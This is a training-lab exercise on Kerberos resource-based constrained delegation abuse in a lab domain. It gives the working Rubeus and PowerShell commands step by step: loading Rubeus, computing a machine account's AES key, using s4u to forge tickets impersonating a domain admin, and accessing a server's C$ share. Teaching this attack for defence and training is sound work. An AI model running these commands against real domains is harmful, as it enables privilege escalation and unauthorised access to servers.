# Exercise 6 - Kerberos Ressource-based Constrained Delegation

## Tools

You can find all tools needed in the ["attacker-tools.zip"-file](../exercises/attacker-tools). The links below are for your own reference.

Tools needed:

- PowerView: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- Rubeus: [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

## Exercise

In this exercise, we'll abuse the ressource-based constrained delegation permissions we acquired in exercise 3. You already learned by now why we gave those permissions to the taskservice account and not to john directly: it's all about the SPN.

Let's dive into the topic. The attackflow and the commands are very similar to the previous exercise. In fact, we're doing more or less the same - just the permissions that allow us to do so are different.

Open powershell with admin rights (right-click "Run as Administrator") and load rubeus/powerview.

```
cd C:\attacker-tools
cat -raw .\Invoke-Rubeus.ps1 | iex
```

Rubeus allows us to start powershell in a new logon session. This implies that the tickets we forge only exist in this logon session and do not interfere with the already existing kerboers tickets of user john. 

```
Invoke-Rubeus -Command "createnetonly /program:C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe /show"
```

Remember, execute the commands below in the powershell you just started with rubeus!

```
cd C:\attacker-tools
cat -raw .\Invoke-Rubeus.ps1 | iex
```

Calculate the AES keys of evilpc$.

```
Invoke-Rubeus -Command "hash /password:EvilPassword1 /domain:contoso.com /user:evilpc$"
```

Now use s4u to request a TGS impersonating the domain admin user "Bruce Willis" (bwillis) against adsec-01. We request 3 tickets for 3 different services. "CIFS" will be used for SMB access and "HOST"/"RPCSS" are needed for WMI.

```
Invoke-Rubeus -Command "s4u /user:evilpc$ /aes256:7217DCA9120F62686DB482695281FA79A3F2836553757E4FE5DDB37DB7D638FC /impersonateuser:bwillis /msdsspn:cifs/adsec-01.contoso.com /ptt"
Invoke-Rubeus -Command "s4u /user:evilpc$ /aes256:7217DCA9120F62686DB482695281FA79A3F2836553757E4FE5DDB37DB7D638FC /impersonateuser:bwillis /msdsspn:host/adsec-01.contoso.com /ptt"
Invoke-Rubeus -Command "s4u /user:evilpc$ /aes256:7217DCA9120F62686DB482695281FA79A3F2836553757E4FE5DDB37DB7D638FC /impersonateuser:bwillis /msdsspn:rpcss/adsec-01.contoso.com /ptt"
```

Have a look at the kerberos tickets you just created by running klist.

```
klist
```

Let's see if that worked. Try to access the server through SMB.

```
ls \\adsec-01.contoso.com\C$
```


# Questions
- None :-) You did well, have a coffee!
